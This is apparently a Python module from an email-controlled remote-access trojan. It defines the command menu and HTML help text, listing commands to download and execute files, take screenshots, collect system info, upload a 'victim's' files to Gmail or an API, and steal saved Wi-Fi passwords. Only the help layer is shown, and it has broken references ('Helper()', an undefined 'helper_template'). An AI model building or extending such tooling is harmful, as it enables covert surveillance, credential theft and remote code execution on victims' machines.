import importlib

class download:
    def __init__(self):
        self.name = "download"
        self.info = "Downloads a file from Given Url and Executes It(Not plain text file only bytes)"
        self.args = ["Url: Url To Download","Name: Name to Save the file","Bool: True of False to run after execution"]
        self.command = ":download,Url,Name,Bool"

class screenshot:
    def __init__(self):
        self.info = "📸 Snaps a pic of the screen and sends it over like 💨"
        self.name = "screenshot"
        self.args = []
        self.isCrossPlatfrom = True
        self.command = ":screenshot"

class systeminfo:
    def __init__(self):
        self.name = "systeminfo"
        self.info = "Gives Basic System Information of File"
        self.args = []
        self.command = ":systeminfo"


class upload:
    def __init__(self):
        self.name = "UrlUploader"
        self.info = "Uploads a file from Given Path to Gmail or an Api (if file greater than 25MB)"
        self.args = ["Path: Path from victim to download file"]
        self.command = ":upload,[Path]"

class wifi:
    def __init__(self):
        self.name = "Wifi"
        self.info = "Retrieves Saved Wifi Passwords"
        self.args = []
        self.command = ":wifi"


class helper:
    def __init__(self):
        self.info = ""

    def smallHelpTemplate(self,heading,info,command,args_info):
        template = f"""
<h2>{heading}</h2>
<p class="info">{info}</p>
<div class="command-structure">
    <p><strong>Command Structure-</strong> {command}</p>
    <div class="args">
        {args_info}
        
    </div>
</div>
"""
        return template


    def helpfunctions(self):
        self.info += self.smallHelpTemplate(
            heading="Help",
            info="Gives a helping hand Know about tool better",
            command=":help",
            args_info="<p><strong>args1:</strong> No arguments</p>"
        )
        

        listOfClasses = [screenshot, systeminfo, download, upload, wifi]
        for classes in listOfClasses:
            Class = classes()
            args_info = ""
            if Class.args == []:
                args_info += "<p><strong>args:</strong> No Arguments</p>"
            else:
                for arg in Class.args:
                    arg = arg.split(":")
                    args_info += f"<p><strong>{arg[0]}-</strong> {arg[1]}</p>"

            self.info += self.smallHelpTemplate(
                heading=Class.name,
                info=Class.info,
                command=Class.command,
                args_info= args_info
            )


        return helper_template(self.info)
    
    def run(self,EmailHandler,msgId):
        EmailHandler.send_email(
            message = self.helpfunctions(),
            msgId=msgId,
            reply=True
        )

if __name__ == "__main__":
    help = Helper()
    print(help.helpfunctions())
    


        
        

    

